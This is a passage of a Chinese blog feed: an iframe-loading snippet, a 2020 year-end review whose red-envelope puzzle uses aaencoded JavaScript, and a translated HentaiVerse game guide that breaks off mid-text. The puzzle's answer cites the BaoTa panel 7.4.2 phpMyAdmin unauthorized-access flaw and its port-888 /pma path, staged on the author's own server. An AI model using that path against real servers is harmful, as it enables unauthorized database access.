class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 4分8秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量...</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板...）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 